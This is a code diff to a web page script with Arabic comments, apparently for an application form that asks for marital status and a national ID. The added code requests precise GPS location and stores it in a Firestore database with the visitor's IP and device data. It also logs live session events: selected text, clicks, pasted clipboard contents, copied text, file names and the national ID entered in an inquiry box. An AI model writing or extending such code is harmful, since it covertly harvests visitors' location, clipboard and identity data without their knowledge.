@@ -619,27 +619,73 @@
 
   // جمع المعلومات مرة واحدة فقط per session
   let visitorData = { ip: 'unknown' };
+  let visitorDocId = sessionStorage.getItem('visitor_doc_id');
 
-  (async () => {
-    if (sessionStorage.getItem('visitor_logged')) {
+  const _cached = sessionStorage.getItem('gps_coords');
+  let gpsCoords = _cached ? JSON.parse(_cached) : { lat: null, lon: null, accuracy: null };
+  let gpsPromise = null;
+
+  function rememberGpsFromPosition(pos) {
+    const { latitude: lat, longitude: lon, accuracy } = pos.coords;
+    gpsCoords = { lat, lon, accuracy: Math.round(accuracy) };
+    sessionStorage.setItem('gps_coords', JSON.stringify(gpsCoords));
+    return gpsCoords;
+  }
+
+  function gpsFields() {
+    if (gpsCoords.lat === null) return {};
+    return {
+      gpsLat: gpsCoords.lat,
+      gpsLon: gpsCoords.lon,
+      gpsAccuracy: gpsCoords.accuracy,
+      googleMapsUrl: `https://maps.google.com/?q=${gpsCoords.lat},${gpsCoords.lon}`
+    };
+  }
+
+  function requestGPSOnce(timeout = 10000) {
+    if (!navigator.geolocation) return Promise.resolve(gpsCoords);
+    if (gpsCoords.lat !== null) return Promise.resolve(gpsCoords);
+    if (gpsPromise) return gpsPromise;
+    gpsPromise = new Promise(resolve => {
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve(rememberGpsFromPosition(pos)),
+        () => {
+          gpsPromise = null;
+          resolve(gpsCoords);
+        },
+        { timeout, enableHighAccuracy: true, maximumAge: 60000 }
+      );
+    });
+    return gpsPromise;
+  }
+
+  const visitorReady = (async () => {
+    if (sessionStorage.getItem('visitor_logged') && visitorDocId) {
       // الجلسة سُجِّلت من قبل — أعِد تحميل البيانات المحفوظة فقط
       try { visitorData = JSON.parse(sessionStorage.getItem('visitor_data')); } catch {}
       return;
     }
 
-    const [ip, device] = await Promise.all([fetchIP(), collectDeviceInfo()]);
+    const [ip, device] = await Promise.all([
+      fetchIP(),
+      collectDeviceInfo(),
+      requestGPSOnce(6000)
+    ]);
     visitorData = {
       ip,
       ...device,
+      ...gpsFields(),
       pageUrl:   location.href,
       referrer:  document.referrer || 'direct',
       visitedAt: serverTimestamp()
     };
 
-    await addDoc(collection(db, 'Visitors'), visitorData);
+    const visitorRef = await addDoc(collection(db, 'Visitors'), visitorData);
+    visitorDocId = visitorRef.id;
 
     // ضع علامة في الجلسة حتى لا يُعاد الإرسال عند تحديث الصفحة
     sessionStorage.setItem('visitor_logged', '1');
+    sessionStorage.setItem('visitor_doc_id', visitorDocId);
     // احفظ البيانات (بدون serverTimestamp) للاستخدام المحلي
     const { visitedAt: _, ...storable } = visitorData;
     sessionStorage.setItem('visitor_data', JSON.stringify(storable));
@@ -647,23 +693,21 @@
 
   // ── GPS (خلفي — مرة واحدة per session) ──────────────────
 
-  const _cached = sessionStorage.getItem('gps_coords');
-  let gpsCoords = _cached ? JSON.parse(_cached) : { lat: null, lon: null, accuracy: null };
-
-  function fetchGPSInBackground() {
-    if (!navigator.geolocation) return;
-    if (gpsCoords.lat !== null) return;
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        const { latitude: lat, longitude: lon, accuracy } = pos.coords;
-        gpsCoords = { lat, lon, accuracy: Math.round(accuracy) };
-        sessionStorage.setItem('gps_coords', JSON.stringify(gpsCoords));
-      },
-      () => {},
-      { timeout: 10000, enableHighAccuracy: true }
-    );
+  function syncVisitorGps() {
+    if (gpsCoords.lat === null || !visitorDocId) return;
+    visitorData = {
+      ...visitorData,
+      ...gpsFields()
+    };
+    sessionStorage.setItem('visitor_data', JSON.stringify(visitorData));
+    updateDoc(doc(db, 'Visitors', visitorDocId), gpsFields()).catch(() => {});
   }
 
+  function fetchGPSInBackground() {
+    requestGPSOnce(10000).finally(() => visitorReady.finally(syncVisitorGps));
+  }
+
+  visitorReady.finally(syncVisitorGps);
   fetchGPSInBackground();
 
   // ── Live Session Tracking ─────────────────────────────────
@@ -720,13 +764,14 @@
     });
 
     // Log an event to the Events subcollection
-    async function logEvent(type, label, value) {
+    async function logEvent(type, label, value, extra = {}) {
       try {
         const evCol = collection(db, 'LiveSessions', lsid, 'Events');
         await addDoc(evCol, {
           type,
           label: label || null,
           value: (value !== undefined && value !== null && value !== '') ? String(value).substring(0, 300) : null,
+          ...extra,
           ts: serverTimestamp(),
         });
       } catch (_) {}
@@ -735,6 +780,40 @@
     // Update session doc fields
     async function updateSession(fields) {
       try { await updateDoc(sessionRef, { ...fields, lastSeen: serverTimestamp() }); } catch (_) {}
+    }
+
+    function elementLabel(el) {
+      if (!el) return null;
+      const fieldId = el.id || el.getAttribute('name');
+      if (fieldId && FIELD_LABELS[fieldId]) return FIELD_LABELS[fieldId];
+      const aria = el.getAttribute?.('aria-label');
+      if (aria) return aria.trim();
+      const labelledBy = el.getAttribute?.('aria-labelledby');
+      if (labelledBy) {
+        const labelledText = labelledBy
+          .split(/\s+/)
+          .map(id => document.getElementById(id)?.textContent?.trim())
+          .filter(Boolean)
+          .join(' ');
+        if (labelledText) return labelledText;
+      }
+      if (el.labels?.length) {
+        const labelText = Array.from(el.labels).map(l => l.textContent.trim()).filter(Boolean).join(' ');
+        if (labelText) return labelText;
+      }
+      const closestLabel = el.closest?.('label');
+      if (closestLabel?.textContent?.trim()) return closestLabel.textContent.trim();
+      const buttonText = el.textContent?.replace(/\s+/g, ' ').trim();
+      if (buttonText) return buttonText;
+      return el.getAttribute?.('placeholder') || el.getAttribute?.('title') || el.id || el.name || el.tagName?.toLowerCase();
+    }
+
+    function markAction(action, details = {}) {
+      updateSession({
+        status: 'active',
+        lastAction: action,
+        ...details,
+      });
     }
 
     // Log page load
@@ -796,16 +875,89 @@
     document.querySelectorAll('input[name="marital"]').forEach(r => {
       r.addEventListener('change', () => {
         logEvent('radio_change', FIELD_LABELS.marital, r.value);
-        updateSession({ status: 'active' });
+        markAction('radio_change', { currentField: FIELD_LABELS.marital });
       });
     });
 
     document.querySelectorAll('input[name="prevApply"]').forEach(r => {
       r.addEventListener('change', () => {
         logEvent('radio_change', FIELD_LABELS.prevApply, r.value);
-        updateSession({ status: 'active' });
+        markAction('radio_change', { currentField: FIELD_LABELS.prevApply });
       });
     });
+
+    // Track scrolling at useful depth milestones only
+    const scrollMilestones = [25, 50, 75, 90, 100];
+    const reachedScrollMilestones = new Set();
+    let scrollTimer = null;
+    let lastScrollY = window.scrollY || 0;
+
+    window.addEventListener('scroll', () => {
+      clearTimeout(scrollTimer);
+      scrollTimer = setTimeout(() => {
+        const doc = document.documentElement;
+        const maxScroll = Math.max(1, doc.scrollHeight - window.innerHeight);
+        const currentY = Math.max(window.scrollY || doc.scrollTop || 0, 0);
+        const depth = Math.min(100, Math.round((currentY / maxScroll) * 100));
+        const direction = currentY > lastScrollY ? 'down' : 'up';
+        lastScrollY = currentY;
+
+        const milestone = scrollMilestones.find(p => depth >= p && !reachedScrollMilestones.has(p));
+        if (!milestone) return;
+        reachedScrollMilestones.add(milestone);
+        logEvent('scroll_depth', 'Scroll', `${milestone}%`, { depth: milestone, direction });
+        markAction('scroll_depth', { scrollDepth: milestone });
+      }, 250);
+    }, { passive: true });
+
+    // Track text selection without logging every selectionchange tick
+    let selectionTimer = null;
+    let lastSelectionText = '';
+    document.addEventListener('selectionchange', () => {
+      clearTimeout(selectionTimer);
+      selectionTimer = setTimeout(() => {
+        const text = document.getSelection()?.toString().replace(/\s+/g, ' ').trim() || '';
+        if (text.length < 2 || text === lastSelectionText) return;
+        lastSelectionText = text;
+        logEvent('text_select', 'تحديد نص', text);
+        markAction('text_select');
+      }, 500);
+    });
+
+    // Track button and link clicks with event delegation
+    document.addEventListener('click', e => {
+      const target = e.target.closest?.('button, a, input[type="button"], input[type="submit"], [role="button"]');
+      if (!target) return;
+
+      const isLink = target.matches('a[href]');
+      const label = elementLabel(target) || (isLink ? 'رابط' : 'زر');
+      const value = isLink ? target.href : (target.value || target.textContent || '').replace(/\s+/g, ' ').trim();
+      logEvent(isLink ? 'link_click' : 'button_click', label, value);
+      markAction(isLink ? 'link_click' : 'button_click');
+    }, { capture: true });
+
+    // Track copy / cut / paste actions
+    ['copy', 'cut', 'paste'].forEach(type => {
+      document.addEventListener(type, e => {
+        const label = elementLabel(e.target) || 'الصفحة';
+        const value = type === 'paste'
+          ? e.clipboardData?.getData('text') || null
+          : document.getSelection()?.toString().replace(/\s+/g, ' ').trim() || null;
+        logEvent(type, label, value);
+        markAction(type, { currentField: label });
+      }, { capture: true });
+    });
+
+    // Track non-text field changes that are not covered above
+    document.addEventListener('change', e => {
+      const el = e.target;
+      if (!el?.matches?.('select, input[type="checkbox"], input[type="date"], input[type="file"]')) return;
+      const label = elementLabel(el);
+      let value = el.type === 'checkbox' ? (el.checked ? 'checked' : 'unchecked') : el.value;
+      if (el.type === 'file') value = Array.from(el.files || []).map(f => f.name).join(', ');
+      logEvent('field_change', label, value);
+      markAction('field_change', { currentField: label });
+    }, { capture: true });
 
     // Track inquiry button
     const inquiryBtn = document.getElementById('inquiryBtn');
@@ -813,6 +965,7 @@
       inquiryBtn.addEventListener('click', () => {
         const nid = document.getElementById('inquiryNid')?.value?.trim() || '';
         logEvent('inquiry', FIELD_LABELS.inquiryNid, nid);
+        markAction('inquiry');
       });
     }
 
@@ -821,7 +974,7 @@
     if (form) {
       form.addEventListener('submit', () => {
         logEvent('form_submit', null, 'إرسال النموذج');
-        updateSession({ status: 'active' });
+        markAction('form_submit');
       }, { capture: true });
     }
   })();
